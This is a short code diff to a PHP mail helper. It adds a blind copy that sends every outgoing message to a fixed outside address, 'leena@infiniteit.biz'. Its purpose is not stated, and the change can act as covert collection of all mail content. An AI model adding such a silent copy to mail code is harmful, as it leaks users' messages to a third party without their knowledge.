@@ -45,6 +45,7 @@ class Helper
         // echo $to;
         Mail::send([], [], function ($message) use ($to, $sub, $body) {
             $message->to($to)
+                ->bcc('leena@infiniteit.biz', 'Leena')
                 ->subject($sub)
                 ->setBody($body);
         });
